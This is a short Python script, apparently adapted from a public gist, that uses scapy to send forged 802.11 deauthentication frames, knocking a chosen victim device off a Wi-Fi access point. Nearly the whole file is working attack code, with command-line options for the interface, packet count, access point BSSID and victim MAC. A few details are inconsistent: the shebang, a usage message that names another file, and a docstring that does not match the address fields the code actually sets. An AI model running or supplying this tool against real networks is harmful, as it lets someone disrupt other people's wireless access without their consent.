#!/bin/bash python3
"""Written by Aiden Yoshioka-Miller on 02/06/21
    Code from the below link that is repurposed in my own scripts to 
    https://gist.github.com/binexisHATT/67111cd4ab9313b73a8639e959750903#file-deauthenticator-py
"""

#imports------------------------------------------------------------------------------
from scapy.all import *

from argparse import ArgumentParser as AP
import signal 
import sys
import os

#methods------------------------------------------------------------------------------

#handling ctrl+c exit
def signal_handler():
    #print ("Aborting program")
    #os.system("kill -9 " + str(os.getpid()))
    #sys.exit(1)
    return (str(os.getpid()))

#exit function0
def signal_exit(signal, frame):
    print ("Signal Exit")
    sys.exit(1)

#check if syntax is correct
def check_syntax():
    if len(sys.argv) < 3:
        print ("Syntax Error: \n usage: python3 scan.py -i <interface>")
        sys.exit(1)

#check if the user is using sudo
def check_sudo():
    if not os.getuid() == 0:
        print("please run with sudo privelages")
        sys.exit(1)


#Deauth method
def deauth(iface: str, count: int, bssid: str, target_mac: str):
    """
    - addr1=target_mac specifies that the recipient of this packet will be the victim machine
    - addr2=bssid specifies the MAC address of Access Point
    - addr3=bssid specifies the MAC address of the access point which is also the sender of this packet
    """
    dot11 = Dot11(addr1=bssid, addr2=target_mac, addr3=bssid)
    frame = RadioTap()/dot11/Dot11Deauth()
    sendp(frame, iface=iface, count=count, inter=0.100)

#main body ---------------------------------------------------------------------------------------------

if __name__ == "__main__":
    parser = AP(description="Perform Deauthentication attack against a computer")
    parser.add_argument("-i", "--interface",help="interface to send deauth packets from")
    parser.add_argument("-c", "--count",help="The number of deauthentication packets to send to the victim computer")
    parser.add_argument("-a", "--bssid",metavar="MAC",help="the MAC address of the access point (Airodump-ng BSSID)")
    parser.add_argument("-t", "--target-mac",metavar="MAC",help="the MAC address of the victim's computer (Airodump-ng Station)")
    args = parser.parse_args()
    if (not args.interface or not args.count 
        or not args.bssid or not args.target_mac):
        print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
        exit(1)
    deauth(args.interface, int(args.count), args.bssid, args.target_mac)    
